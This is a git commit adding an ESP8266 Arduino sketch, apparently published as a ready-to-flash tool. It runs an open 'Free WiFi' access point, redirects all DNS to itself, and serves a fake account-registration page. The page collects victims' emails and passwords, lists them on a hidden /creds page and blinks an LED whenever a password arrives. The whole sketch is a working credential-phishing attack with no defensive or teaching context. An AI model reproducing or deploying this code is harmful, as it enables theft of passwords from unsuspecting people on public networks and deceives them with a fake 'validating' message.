f8c4a463443585b2c091d9f38ada265e30f7ecfa
BlueArduino20 <bluearduino20@gmail.com>
2019-08-25 15:54:57 +0200

    Sketch added

---
+++ ESP8266_WiFi_Captive_Portal_2.0.ino
@@ -0,0 +1,110 @@
+// ESP8266 WiFi Captive Portal
+// By BlueArduino20
+// Based on: PopupChat https://github.com/tlack/popup-chat
+
+// Includes
+#include <ESP8266WiFi.h>
+#include <DNSServer.h> 
+#include <ESP8266WebServer.h>
+
+// User configuration
+#define SSID_NAME "Free WiFi"
+#define SUBTITLE "Free WiFi service."
+#define TITLE "Register:"
+#define BODY "Create an account to get connected to the internet."
+#define POST_TITLE "Validating..."
+#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
+#define PASS_TITLE "Credentials"
+#define CLEAR_TITLE "Cleared"
+
+// Init System Settings
+const byte HTTP_CODE = 200;
+const byte DNS_PORT = 53;
+const byte TICK_TIMER = 1000;
+IPAddress APIP(192, 168, 1, 1); // Gateway
+
+String Credentials="";
+unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
+DNSServer dnsServer; ESP8266WebServer webServer(80);
+
+String input(String argName) {
+  String a=webServer.arg(argName);
+  a.replace("<","&lt;");a.replace(">","&gt;");
+  a.substring(0,200); return a; }
+
+String footer() { return 
+  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+}
+
+String header(String t) {
+  String a = String(SSID_NAME);
+  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
+    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+    "div { padding: 0.5em; }"
+    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
+    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
+    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+    "textarea { width: 100%; }";
+  String h = "<!DOCTYPE html><html>"
+    "<head><title>"+a+" :: "+t+"</title>"
+    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+    "<style>"+CSS+"</style></head>"
+    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
+  return h; }
+
+String creds() {
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+}
+
+String index() {
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
+    "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
+    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=Register></form></center>" + footer();
+}
+
+String posted() {
+  String email=input("email");
+  String password=input("password");
+  Credentials="<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
+  return header(POST_TITLE) + POST_BODY + footer();
+}
+
+String clear() {
+  String email="<p></p>";
+  String password="<p></p>";
+  Credentials="<p></p>";
+  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+}
+
+void BLINK() { // The internal LED will blink 5 times when a password is received.
+  int count = 0;
+  while(count < 5){
+    digitalWrite(BUILTIN_LED, LOW);
+    delay(500);
+    digitalWrite(BUILTIN_LED, HIGH);
+    delay(500);
+    count = count + 1;
+  }
+}
+
+void setup() {
+  bootTime = lastActivity = millis();
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(SSID_NAME);
+  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
+  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
+  webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
+  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
+  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
+  webServer.begin();
+  pinMode(BUILTIN_LED, OUTPUT);
+  digitalWrite(BUILTIN_LED, HIGH);
+}
+
+
+void loop() { 
+  if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
+dnsServer.processNextRequest(); webServer.handleClient(); }
